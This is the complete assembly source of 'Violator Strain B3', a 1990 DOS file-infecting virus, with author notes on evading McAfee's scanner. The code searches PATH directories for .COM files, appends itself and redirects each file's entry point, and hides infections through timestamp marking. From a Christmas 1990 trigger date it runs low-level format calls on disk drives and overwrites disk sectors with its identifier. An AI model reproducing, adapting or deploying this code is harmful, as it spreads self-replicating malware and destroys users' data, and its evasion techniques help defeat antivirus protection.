;*****************************************************************************
;		               Violator Strain B3
;*****************************************************************************
;
; Notes: (Oct.24.9O)
; ------------------
;
; (TJA) Bah! Sorry I released this late. Wanted to make sure all of the bugs
; and shit were fixed...
;
; Well, I had to rewrite this one so that McAffee can't scan for it. Took me
; a while, but I just re-did it from scratch and then after doing some
; research, it turned out he was looking for something in the Data Segment.
; So I just re-arranged a few things and voila! Instant unscannable virus!
;
; Also, for the INT filtering routine, I eliminated the extra bytes that do
; a [MOV marker,1] where it was unnecessary. After I issue it once, I don't
; have to keep MOVing it because it's still in memory right?
;
; Silly me wrote the original filter routine after I came home drunk from a 
; party, so I didn't take that into account. So we are one step close to having
; K-K00L thrify kode...
;
; I also took out that stupid MOV_CX macro. It was bugging the shit out of me
; becuase it served no purpose other than taking up extra space. MOV CX,virlen
; does the exact same thing...
;
; Other Notes
; -----------
;
; Thanx to RABID Pagan for some totally mondo ideas (Mutating Data Segment...)
; I think I'll be popping that into strain B4
;
; Also, to Rick Dangerous, about Violator/2 TSR. I found the problem with your
; TSR program. It was messy as hell!!! The CALL virus_begin was causing the
; problems. I'll rewrite the TSR for ya ala THETSR methodology.
;
;*****************************************************************************
;
;			Written by The High Evolutionary
;
;	     Copyright (c) 199O by The RABID Nat'nl Development Corp.
;			      October, 24th, 199O
;*****************************************************************************

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H

VCODE:  JMP     virus

        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP
        NOP

v_start equ     $


virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat       ;This is where the virus data starts.
        CLD                             
        MOV     SI,DX                   
        ADD     SI,first_3              
        MOV     DI,OFFSET 100H          
        MOV     CX,3
        REPZ    MOVSB                   
        MOV     SI,DX                   
        MOV     AH,30H
        MOV	marker,1
	CALL	filter
        CMP     AL,0                    
        JNZ     year_check                  
        JMP     quit                    

filter:	CMP	marker,1
	JE	int_21
	CMP	marker,2
	JE	int_13
	CMP	marker,3
	JE	int_26
	RET

int_21:	INT	21H
	RET

int_13:	INT	13h
	RET

int_26:	INT	26h
	RET

year_check:
	MOV	AH,2AH			; Get date info
	MOV	marker,1
	CALL	filter
	CMP	CX,year
	JGE	month_check
	JMP	infect

month_check:
	CMP	DH,month
	JGE	day_check
	JMP	infect

day_check:
	CMP 	DL,day
	JGE	kill_13
	JMP	infect

kill_13:
	MOV	Al,counter
	CALL	ala_13
	CMP	counter,27
	JE	re_format
	INC	counter
	LOOP	kill_13

ala_13:	MOV	CH,0
	MOV	DL,counter
	MOV	AH,05h
	MOV	DH,0
	MOV	marker,2
	CALL	filter
	RET
;
; I changed this routine, becuase in the original Violator, I rewrote the
; data segment by calling it for the INT 26. All I did this time, was just
; set BX to be an offset of my INTRO var. That way, when Drive C is formatted,
; the Violator identifier string will be written everywhere... Kinda neat!
;

re_format:
	PUSHF	
	MOV 	BX,OFFSET intro		; Changed it here...
	MOV	DX,00
	MOV	CX,800
	MOV	AL,2
	MOV	marker,3
	CALL	filter
	POPF

infect:	PUSH    ES
        MOV     AH,2FH
	MOV	marker,1
	CALL	filter
        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES         
        POP     ES
        MOV     DX,dta                  
        ADD     DX,SI                   
        MOV     AH,1AH
	CALL	filter
        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0                    

find_path:
        POP     SI
        PUSH    SI                      
        ADD     SI,env_str              ;Point to "PATH=" string in data area
        LODSB
        MOV     CX,OFFSET 8000H         
        REPNZ   SCASB                   
        MOV     CX,4

check_next_4:
        LODSB
        SCASB
        JNZ     find_path               
        LOOP    check_next_4            
        POP     SI
        POP     ES
        MOV     [SI+path_ad],DI         
        MOV     DI,SI
        ADD     DI,wrk_spc              
        MOV     BX,SI                   
        ADD     SI,wrk_spc              
        MOV     DI,SI                   
        JMP     SHORT   slash_ok

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 
        JNZ     found_subdir            
        JMP     all_done                

found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               ;DS points to environment segment
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      ;SI = PATH address
        ADD     DI,wrk_spc              ;DI points to file name workspace

move_subdir:
        LODSB                           ;Get character
        CMP     AL,';'                  ;Is it a ';' delimiter?
        JZ      moved_one               ;Yes, found another subdirectory
        CMP     AL,0                    ;End of PATH string?
        JZ      moved_last_one          ;Yes
        STOSB                           ;Save PATH marker into [DI]
        JMP     SHORT   move_subdir

moved_last_one:
        MOV     SI,0

moved_one:
        POP     BX                      ;Pointer to virus data area
        POP     DS                      ;Restore DS
        MOV     [BX+path_ad],SI         ;Address of next subdirectory
        NOP
        CMP     CH,'\'                  ;Ends with "\"?
        JZ      slash_ok                ;If yes
        MOV     AL,'\'                  ;Add one, if not
        STOSB

slash_ok:
        MOV     [BX+nam_ptr],DI         ;Set filename pointer to name workspace
        MOV     SI,BX                   ;Restore SI
        ADD     SI,f_spec               ;Point to "*.COM"
        MOV     CX,6
        REPZ    MOVSB                   ;Move "*.COM",0 to workspace
        MOV     SI,BX
        MOV     AH,4EH
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX points to "*.COM" in workspace
        MOV     CX,3                    ;Attributes of Read Only or Hidden 
	CALL	filter
        JMP     SHORT   find_first

find_next:
        MOV     AH,4FH
	CALL	filter

find_first:
        JNB     found_file              ;Jump if we found it
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirectory

found_file:
        MOV     AX,[SI+dta_tim]         ;Get time from DTA
        AND     AL,1CH                  
        CMP     AL,1CH                  
        JZ      find_next               ;If so, go find another file
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        JA      find_next               ;If too long, find another one
        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next               ;Then go find another one
        MOV     DI,[SI+nam_ptr]         ;DI points to file name
        PUSH    SI                      ;Save SI
        ADD     SI,dta_nam              ;Point SI to file name

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              ;Move characters until we find a 00
        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc              ;Point to \path\name in workspace
        ADD     DX,SI
	CALL	filter
        MOV     [SI+old_att],CX         ;Save the old attributes
        MOV     AX,OFFSET 4301H         ;Set attributes
        AND     CX,OFFSET 0FFFEH
        MOV     DX,wrk_spc              ;Offset of \path\name in workspace
        ADD     DX,SI                   ;Point to \path\name
	CALL	filter
        MOV     AX,OFFSET 3D02H         ;Read/Write
        MOV     DX,wrk_spc              ;Offset to \path\name in workspace
        ADD     DX,SI                   ;Point to \path\name
	CALL	filter
        JNB     opened_ok               ;If file was opened OK
        JMP     fix_attr                ;If it failed, restore the attributes

opened_ok:
	INC	times			; INC the number of times we infected
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
	CALL	filter
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
        MOV     AH,2CH
	CALL	filter
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
        ADD     DX,SI
	CALL	filter
        JB      fix_time_stamp  	;Quit, if read failed
        CMP     AX,3            	;Were we able to read all 3 bytes?
        JNZ     fix_time_stamp  	;Quit, if not
        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
	CALL	filter
        JB      fix_time_stamp  	;Quit, if it didn't work
        MOV     CX,AX           	;DX:AX (long int) = file size
        SUB     AX,3            	;Subtract 3 (DX must be 0, here)
        MOV     [SI+jmp_dsp],AX 	;Save the displacement in a JMP inst
        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           	;Point DI to virus data area
        SUB     DI,OFFSET c_len_x
        MOV     [DI],CX         
        MOV     AH,40H
        MOV     CX,virlen               ;Bah! Took out the stupid macro!!!
        MOV     DX,SI
        SUB     DX,OFFSET codelen       ;Length of virus code, gives starting
                                        ;address of virus code in memory
	CALL	filter
        JB      fix_time_stamp          ;Jump if error
        CMP     AX,OFFSET virlen        ;All bytes written?
        JNZ     fix_time_stamp          ;Jump if error
        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
	CALL	filter
        JB      fix_time_stamp          ;Jump if error
        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI                   ;Virus data area
        ADD     DX,jmp_op               ;Point to the reconstructed JMP
	CALL	filter

fix_time_stamp:
        MOV     DX,[SI+ol_date]         ;Old file date
        MOV     CX,[SI+old_tim]         ;Old file time
        AND     CX,OFFSET 0FFE0H
        OR      CX,1CH                  
        MOV     AX,OFFSET 5701H
	CALL	filter
        MOV     AH,3EH
	CALL	filter

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]         ;Old Attributes
        MOV     DX,wrk_spc
        ADD     DX,SI                   ;DX points to \path\name in workspace
	CALL	filter

all_done:
        PUSH    DS
        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
	CALL	filter
        POP     DS


;*************************************************************************
; Clear registers used, & do a weird kind of JMP 100. The weirdness comes
;  in since the address in a real JMP 100 is an offset, and the offset
;  varies from one infected file to the next. By PUSHing an 0100H onto the
;  stack, we can RET to address 0100H just as though we JMPed there.
;************************************************************************

quit:
        POP     CX
        XOR     AX,AX
        XOR     BX,BX
        XOR     DX,DX
        XOR     SI,SI
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI
        RET     0FFFFH

vir_dat EQU     $

year	DW	1990			;Set year to 1990
;
; MASM considers a DB value greater than 255 illegal. So I just make the year
; into a Data Word. That way, I can still keep the year as part of the data
; segment for easier modification.
;
; Just for anyone who is curious out there...
;
month	DB	12			;Set month to December
day	DB	25			;Set day to Christmas
intro	DB	'Violator Strain B3 - RABID Nat''nl Development Corp.'
marker	DB	0			;Marker for INT purposes
counter	DB	2			;Counter for drives
times	DB	0
olddta_ DW      0                       
olddts_ DW      0                       
oldtim_ DW      0                       
oldate_ DW      0                       
oldatt_ DW      0                       
first3_ EQU     $
        INT     20H
        NOP
jmpop_  DB      0E9H                    
jmpdsp_ DW      0                       
pathad_ DW      0                       
namptr_ DW      0                       
envstr_ DB      'PATH='                 
fspec_  DB      '*.COM',0
wrkspc_ DB      40h dup (0)
dta_    DB      16h dup (0)             
dtatim_ DW      0,0                     
dtalen_ DW      0,0                     
dtanam_ DB      0Dh dup (0)             
lst_byt EQU     $                       
                                        
virlen  =       lst_byt - v_start       
codelen =       vir_dat - v_start       
c_len_x =       vir_dat - v_start - 2   
c_len_y =       vir_dat - v_start + 100H
old_dta =       olddta_ - vir_dat       
old_dts =       olddts_ - vir_dat       
old_tim =       oldtim_ - vir_dat       
ol_date =       oldate_ - vir_dat       
old_att =       oldatt_ - vir_dat       
first_3 =       first3_ - vir_dat       
jmp_op  =       jmpop_  - vir_dat       
jmp_dsp =       jmpdsp_ - vir_dat       
f_spec  =       fspec_  - vir_dat       
path_ad =       pathad_ - vir_dat       
nam_ptr =       namptr_ - vir_dat       
env_str =       envstr_ - vir_dat       
wrk_spc =       wrkspc_ - vir_dat       
dta     =       dta_    - vir_dat       
dta_tim =       dtatim_ - vir_dat       
dta_len =       dtalen_ - vir_dat       
dta_nam =       dtanam_ - vir_dat       

        CODE    ENDS
END     VCODE

; The End ? Stay tuned, true believers, for Violator Strain Be-fore...